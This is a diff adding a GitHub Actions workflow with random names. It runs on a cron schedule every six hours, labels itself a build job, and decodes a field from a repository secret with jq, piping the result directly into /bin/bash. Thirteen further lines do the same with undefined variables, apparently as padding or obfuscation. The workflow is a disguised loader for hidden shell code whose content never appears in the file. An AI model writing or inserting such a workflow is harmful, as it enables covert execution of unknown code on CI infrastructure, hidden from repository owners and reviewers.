@@ -1,0 +1,31 @@
+name: yinkaldk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinkaldk
+        env:
+          byr48: ${{ secrets.byr48 }}
+        run: |
+          echo $byr48 | jq -r .dwd58 | /bin/bash
+          echo $rhh01 | jq -r .uw31800 | /bin/bash
+          echo $teryl9826 | jq -r .cnp8 | /bin/bash
+          echo $zkjs8 | jq -r .tmvwh43079 | /bin/bash
+          echo $qsayw5 | jq -r .pd22 | /bin/bash
+          echo $dium73 | jq -r .ruue29067 | /bin/bash
+          echo $k08 | jq -r .bnsrj23 | /bin/bash
+          echo $xqp41 | jq -r .bbal9 | /bin/bash
+          echo $k6125 | jq -r .owc07770 | /bin/bash
+          echo $hyoki803 | jq -r .waw2 | /bin/bash
+          echo $uvj6148 | jq -r .x72057 | /bin/bash
+          echo $jskm87585 | jq -r .lkfl8 | /bin/bash
+          echo $mjvse92 | jq -r .lrl00 | /bin/bash
+          echo $i73 | jq -r .xjkst171 | /bin/bash
+
